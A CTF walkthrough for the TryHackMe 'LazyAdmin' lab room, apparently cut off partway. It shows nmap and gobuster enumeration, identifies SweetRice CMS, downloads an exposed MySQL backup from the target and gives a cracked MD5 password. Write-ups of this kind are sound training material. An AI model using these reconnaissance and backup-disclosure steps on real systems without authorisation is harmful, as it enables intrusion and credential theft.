# 🛡️ TryHackMe: LazyAdmin – Walkthrough & Report

**Room:** [LazyAdmin](https://tryhackme.com/room/lazyadmin)  
**Difficulty:** Easy  
**Target IP:** 10.10.187.142  
**Objective:** Capture the user and root flags by identifying and exploiting vulnerabilities

---

## 🧭 Enumeration

### 🔎 Nmap Scan

```bash
nmap -Pn -sC -sV -oN lazyadmin.nmap 10.10.187.142
```

**Findings:**

- `22/tcp` – OpenSSH
- `80/tcp` – Apache HTTPD with default Ubuntu page

---

## 🌐 Web Discovery

Visited `http://10.10.187.142`, revealed default Apache page.  
No custom web app present at root.

Used Gobuster to enumerate directories:

```bash
gobuster dir -u http://10.10.187.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Findings:**

- `/content/`
- `/server-status/` (403)

Further enumeration on `/content/` revealed:

- `/content/as/`
- `/content/inc/`
- `/content/inc/mysql_backup/`

---

## 🔍 CMS Identification

Visiting `/content/` revealed the site is running **SweetRice CMS**, which is known to be vulnerable.

---

## 💥 Exploitation: SweetRice Backup Disclosure

Visited:

```
http://10.10.187.142/content/inc/mysql_backup/
```

Found file:

```
mysql_backup_20191129023059-1.5.1.sql
```

Downloaded with:

```bash
wget http://10.10.187.142/content/inc/mysql_backup/mysql_backup_20191129023059-1.5.1.sql
```

Cracked MD5 hash:

```
42f749ade7f9e195bf475f37a44cafcb → Password123
```

---
